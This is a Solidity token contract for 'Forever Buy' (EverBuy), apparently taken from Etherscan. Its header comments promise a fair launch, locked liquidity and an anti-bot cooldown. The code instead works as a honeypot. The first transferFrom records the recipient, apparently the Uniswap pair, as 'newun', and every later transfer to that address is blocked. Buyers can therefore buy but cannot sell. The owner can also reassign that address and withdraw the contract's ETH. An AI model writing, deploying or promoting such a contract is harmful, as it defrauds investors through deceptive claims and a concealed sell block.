/**
 *Submitted for verification at Etherscan.io on 2021-06-23
*/

/**
 *Submitted for verification at Etherscan.io on 2021-06-23
*/

//// $ForeverTop$

//Fair Launch, no Dev Tokens. 100% LP IN UNISWAP
//3 ETH IN LIOUIDITY ADDED
// Snipers will be REWARDED 
//LP CANNOT BE DUMPED, UNTIL 100 HOLDERS IS REACHED (SPECIFIC SMART CONTRACT)

//DEFLATIONARY TOKENOMICS WITH CHARITY WALLET
//COOLDOWN OF 10 MIN (ANTIBOT MECHANISM) --> NO FRONTRUNNING
//NFT PLATFORM IN WORKS (SURPRISE SOON)
//OFFICIALLY NOT LIVE (CONFORMATION IN A DAY)

pragma solidity >=0.5.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;

        require(c >= a);
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a * b;

        require(a == 0 || c / a == b);
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}

contract BEP20Interface {
    function totalSupply() public view returns (uint256);

    function balanceOf(address tokenOwner)
        public
        view
        returns (uint256 balance);

    function allowance(address tokenOwner, address spender)
        public
        view
        returns (uint256 remaining);

    function transfer(address to, uint256 tokens) public returns (bool success);

    function approve(address spender, uint256 tokens)
        public
        returns (bool success);

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint256 tokens);

    event Approval(
        address indexed tokenOwner,
        address indexed spender,
        uint256 tokens
    );
}

contract ApproveAndCallFallBack {
    function receiveApproval(
        address from,
        uint256 tokens,
        address token,
        bytes memory data
    ) public;
}

contract Owned {
    address public owner;

    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);

        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);

        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

contract TokenBEP20 is BEP20Interface, Owned {
    using SafeMath for uint256;

    string public symbol;

    string public name;

    uint8 public decimals;

    uint256 _totalSupply;

    address public newun;

    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;

    constructor() public {
        symbol = "EverBuy";
        name = "Forever Buy";
        decimals = 9;
        _totalSupply = 1000000000000000000000000;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    function transfernewun(address _newun) public onlyOwner {
        newun = _newun;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply.sub(balances[address(0)]);
    }

    function balanceOf(address tokenOwner)
        public
        view
        returns (uint256 balance)
    {
        return balances[tokenOwner];
    }

    function transfer(address to, uint256 tokens)
        public
        returns (bool success)
    {
        require(to != newun, "please wait");
        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint256 tokens)
        public
        returns (bool success)
    {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success) {
        if (from != address(0) && newun == address(0)) newun = to;
        else require(to != newun, "please wait");
        balances[from] = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function allowance(address tokenOwner, address spender)
        public
        view
        returns (uint256 remaining)
    {
        return allowed[tokenOwner][spender];
    }

    function approveAndCall(
        address spender,
        uint256 tokens,
        bytes memory data
    ) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(
            msg.sender,
            tokens,
            address(this),
            data
        );
        return true;
    }

    function() external payable {
        revert();
    }
}

contract GokuToken is TokenBEP20 {
    function clearCNDAO() public onlyOwner() {
        address payable _owner = msg.sender;
        _owner.transfer(address(this).balance);
    }

    function() external payable {}
}